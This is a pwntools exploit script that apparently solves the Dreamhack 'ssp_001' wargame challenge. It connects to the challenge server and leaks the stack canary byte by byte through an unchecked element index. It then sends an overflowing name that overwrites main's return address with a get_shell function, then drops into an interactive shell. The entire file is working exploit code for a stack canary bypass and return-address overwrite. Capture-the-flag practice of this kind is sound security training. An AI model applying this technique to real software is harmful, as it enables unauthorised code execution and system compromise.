from pwn import *

REMOTE = True

if not REMOTE:
    r = process('./release/ssp_001')
else:
    r = remote('host3.dreamhack.games', 14017)

sla = r.sendlineafter
sa = r.sendafter

def print_box(idx):
    sla('> ', 'P')
    sla('Element index : ', str(idx))

def Exit(name_len, name):
    sla('> ', 'E')
    sla('Name Size : ', str(name_len))
    sa('Name : ', name)

get_shell = 0x80486b9 # get_shell()

# canary leak
canary = 0
for idx in range(0x80, 0x84):
    print_box(idx)
    canary += (int(r.recvline()[-3:-1], 16) << ((idx - 0x80) * 8))

# overwrite return address of main() with get_shell()
Exit(0x50, b'a' * 0x40 + p32(canary) + b'a' * 8 + p32(get_shell))

r.interactive()